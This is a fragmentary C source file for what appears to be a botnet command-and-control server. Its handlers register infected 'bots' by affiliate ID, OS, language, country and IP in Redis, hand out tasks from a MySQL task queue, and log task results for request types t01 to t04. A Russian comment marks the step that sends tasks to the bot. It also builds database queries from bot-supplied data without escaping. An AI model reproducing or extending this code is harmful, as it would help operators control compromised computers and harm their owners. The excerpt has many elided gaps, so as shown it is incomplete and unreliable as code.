...
#define MINOR_HANDLER_VERSION 70

#define RSA_SIGN_SIZE 128
#define BOTID_SIZE 64
#define POST_BODY_MIN_SIZE 100 + 16

#define NRT_SYSTEM_INFO "t01"
#define NRT_TASKS_REQUEST "t02"
#define NRT_TASKS_CONFIRM "t03"
#define NRT_TASKS_REPORT "t04"
...
int logic_update_bot_statistics(redisContext* redisCtx, int isNewBot, long long insideId, const char* uniqid, uint32_t affId, uint16_t subId, uint8_t ver, uint16_t osVer, uint16_t osLang, uint32_t ip, char* countryCode, char* query)
{
...
//	logger_info("%lld:%u:%u:%u:%u:%u:%.7s\n", insideId, affId, subId, ver, osVer, osLang, countryCode);
	...
	if (isNewBot) {
		snprintf(query, 1024, "RPUSH bh:%u %lld:%u:%.64s:%u:%u:%u:%u:%u:%u:%u:%.2s:%u", ts, insideId, isNewBot, uniqid, currTimestamp, currTimestamp, affId, subId, ver, osVer, osLang, countryCode, ip);
	}
	else {
		snprintf(query, 1024, "HGET dtf %lld", insideId);
		logger_info(query);
		redisReply = redisCommand(redisCtx, query);
		if (redisReply == NULL)
			return ERR_REDIS;
		
		snprintf(query, 1024, "RPUSH bh:%u %lld:%u:%.64s:%u:%u:%u:%u:%u:%u:%u:%.2s:%u", ts, insideId, isNewBot, uniqid, (uint32_t)atoll(redisReply->str), currTimestamp, affId, subId, ver, osVer, osLang, countryCode, ip);
		freeReplyObject(redisReply);
	}
...
int logic_get_bot_info(redisContext* redisCtx, char* query, long long insideId, uint8_t* pVer, uint32_t* pAffId, uint16_t* pSubId, uint16_t* pOsVer, uint16_t* pOsLang, char* cc)
{
	int err = ERR_REDIS;
	redisReply* rrAffId;
	redisReply* rrSubId;
	...
	do {
		snprintf(query, 1024, "HGET affids %lld", insideId);
		logger_info(query);
		...
		if (rrAffId->type != REDIS_REPLY_NIL) {
			*pAffId = (uint32_t)atoll(rrAffId->str);
		}
		freeReplyObject(rrAffId);
		
		snprintf(query, 1024, "HGET subids %lld", insideId);
		logger_info(query);
		...
		snprintf(query, 1024, "HGET vers %lld", insideId);
		logger_info(query);
		...
		snprintf(query, 1024, "HGET osvers %lld", insideId);
		logger_info(query);
		...
		snprintf(query, 1024, "HGET oslngs %lld", insideId);
		logger_info(query);
		...
		snprintf(query, 1024, "HGET geos %lld", insideId);
		logger_info(query);
...
//	clientId = *(uint16_t*)(data + 1);
	...
	do {
		...
		if (!botExists) {
			...
			snprintf(query, 1024, "ZADD zids %lld %.64s", insideId, id);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			...
			snprintf(query, 1024, "HSET dtf %lld %u", insideId, (uint32_t)time(NULL));
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			...
			snprintf(query, 1024, "HSET affids %lld %u", insideId, affId);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			...
			snprintf(query, 1024, "HSET subids %lld %u", insideId, subId);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			...
			snprintf(query, 1024, "HSET vers %lld %u", insideId, ver);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			...
			snprintf(query, 1024, "HSET osvers %lld %u", insideId, osVer);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			...
			snprintf(query, 1024, "HSET oslngs %lld %u", insideId, osLang);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			...
			snprintf(query, 1024, "HSET geos %lld %.7s", insideId, countryCode);
			logger_info(query);
			redisReply = redisCommand(redisCtx, query);
			if (redisReply == NULL) {
				break;
			...
			logic_update_bot_statistics(redisCtx, !botExists, insideId, id, affId, subId, ver, osVer, osLang, ip, countryCode, query);
		}
		else {
			uint8_t origVer;
			uint16_t origOsVer;
			...
			if (logic_get_bot_info(redisCtx, query, insideId, &origVer, &affId, &subId, &origOsVer, &origOsLang, (char*)cc) == ERR_OK) {
				if (origVer != ver) {
					snprintf(query, 1024, "HSET vers %lld %u", insideId, ver);
					logger_info(query);
					redisReply = redisCommand(redisCtx, query);
...
int logic_check_tasks_for_bot(const char* const id, uint32_t ip, char* httpHost, uint8_t* data, uint16_t dataLen, uint8_t** pTaskList)
{
	...
	do {
		...
		if (logic_get_bot_info(redisCtx, query, insideId, &ver, &affId, &subId, &osVer, &osLang, (char*)cc) != ERR_OK) {
		...
		snprintf(query, 1024,
			...
			"(t.paused != 1) AND "
			"(t.group_id NOT IN (SELECT task_group_id from bots_task_groups WHERE bot_id = %lld)) AND "
...
final_task:
				if (tGroupId != 0) {
					...
					snprintf(query, 1024, "INSERT INTO bots_tasks(bot_id, task_id, tres_id, update_dt) VALUES(%lld, %.10s, 0, %u)", insideId, *pTaskInfo, currTimestamp);
					logger_info(query);
					...
					END_PERF(query);
					if (mysqlErr == 0) {
						snprintf(query, 1024, "INSERT INTO bots_task_groups(bot_id, task_group_id) VALUES(%lld, %u)", insideId, tGroupId);
						logger_info(query);
	...
	if (err == ERR_OK) {
		logic_update_bot_statistics(redisCtx, 0, insideId, id, affId, subId, ver, osVer, osLang, ip, cc, query);
	}
	else {
		if (taskList != NULL)
...
int logic_report_tasks_for_bot(const char* const id, uint8_t* data, uint16_t dataLen, uint8_t** pTaskList)
{
	...
	do {
		...
		for (i = 0; i < dataLen; i += 5) {
			tres_id = data[i + 4];
			snprintf(query, 1024, "UPDATE bots_tasks SET tres_id=%u,update_dt=%u WHERE bot_id=%lld AND task_id=%u", tres_id == 0 ? 1 : tres_id, currTimestamp, insideId, *(uint32_t*)&data[i]);
			logger_info(query);
...
int logic_parse_and_decode_request(const char* botData, int dataLen, uint8_t** pDecodedData, uint16_t* pDecodedLen, pconfiguration_t* ppConfiguration)
{
	...
	do {
		...
		if (decodedData == NULL) {
			logger_error("logic_parse_and_decode_request: Can't obtain memory from gBotDataPool");
			break;
		}
	...
	do {
		if (strncmp(requestId, NRT_SYSTEM_INFO, 3) == 0) {
			if (logic_parse_and_decode_request(botData, dataLen, &decodedData, &decodedLen, &pConfiguration) != ERR_OK) {
				logger_error("Cannot decode bot data:\n\n%s\n\n", botData);
				break;
			}
		...
		else if (strncmp(requestId, NRT_TASKS_REQUEST, 3) == 0) {			
			if (logic_parse_and_decode_request(botData, dataLen, &decodedData, &decodedLen, &pConfiguration) != ERR_OK) {
				logger_error("Cannot decode bot data:\n\n%s\n\n", botData);
				break;
			}

			if (logic_check_tasks_for_bot(botId, clientIp, httpHost, decodedData, decodedLen, &taskList) != ERR_OK) {
			...
			if (taskList != NULL) {
				dataSize += strlen((char*)(taskList + gGlobalConfig.tasksPerConn * (BYTES_PER_TASK + BYTES_PER_MATRIX)));
			}
			...
			FCGX_FPrintF(pRequest->out, botId);
			if (taskList != NULL) {
				FCGX_FPrintF(pRequest->out, (char*)(taskList + gGlobalConfig.tasksPerConn * (BYTES_PER_TASK + BYTES_PER_MATRIX)));
				mempool_release(&gTasksPool, taskList);
			}
		}
			...
			if (logic_report_tasks_for_bot(botId, decodedData, decodedLen, &taskList) != ERR_OK) {
				logger_error("Cannot check tasks for id: %.64s", botId);
				break;
			}
			...
			// Отправляем клиенту ответ (и если есть, то список задач в теле)
			if (taskList != NULL) {
				dataSize += strlen((char*)(taskList + gGlobalConfig.tasksPerConn * BYTES_PER_REPORT));
			}
			...
			FCGX_FPrintF(pRequest->out, botId);
			if (taskList != NULL) {
				FCGX_FPrintF(pRequest->out, (char*)(taskList + gGlobalConfig.tasksPerConn * BYTES_PER_REPORT));
				mempool_release(&gTasksReportPool, taskList);
			}
		}
		else if (strncmp(requestId, NRT_TASKS_REPORT, 3) == 0) {		
			if (logic_parse_and_decode_request(botData, dataLen, &decodedData, &decodedLen, &pConfiguration) != ERR_OK) {
				logger_error("Cannot decode bot data:\n\n%s\n\n", botData);
				break;
			}
...
//		}
	...
	if (mempool_init(&gBotDataPool, 512, gGlobalConfig.minPoolSize, gGlobalConfig.maxPoolSize))
		exit(1);
